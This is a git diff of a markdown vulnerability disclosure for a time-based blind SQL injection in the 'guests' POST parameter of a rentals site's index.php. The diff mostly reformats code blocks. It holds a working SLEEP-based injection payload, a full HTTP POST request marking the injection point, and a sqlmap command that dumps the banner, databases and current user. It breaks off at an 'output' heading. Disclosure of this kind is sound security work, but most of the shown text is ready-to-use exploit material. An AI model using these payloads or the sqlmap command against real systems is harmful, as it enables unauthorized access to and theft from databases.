@@ -25,14 +25,15 @@ Vulnerability: time-based blind SQL injection in guests (POST) parameter.
 Vulnerabile file: index.php
 <br>
 
-## Vulnerable Parameter: guests (POST)
-Payload: address=3137 Laguna Street&guests=1' AND (SELECT 1769 FROM (SELECT(SLEEP(5)))XPZb) AND
+### Payload
+```sql
+address=3137 Laguna Street&guests=1' AND (SELECT 1769 FROM (SELECT(SLEEP(5)))XPZb) AND
 'ADfU'='ADfU&indate=01/01/1967&lat=1&location=1&long=1&outdate=01/01/1967&searchcity=San Francisco&searchstate=NY
-
+```
 <br>
 
 ### HTTP Post Request
-`
+```sql
 POST /index.php?page=search/rentals HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
@@ -45,13 +46,13 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Host: vlun-host.com
 Connection: Keep-alive
 address=3&guests=-1 [inject_sql_here]&indate=01/01/1967&lat=1&location=1&long=1&outdate=01/01/1967&searchcity=San%20Francisco&searchstate=NY
-
-`
+```
 <br>
+
 ### POC: sqlmap command:
-`
+```sql
 python sqlmap.py -r homestay.txt  -p guests --dbms=MySQL --banner --random-agent --current-db --dbs --current-user
-`
+```
 <br>
 
 ### output:
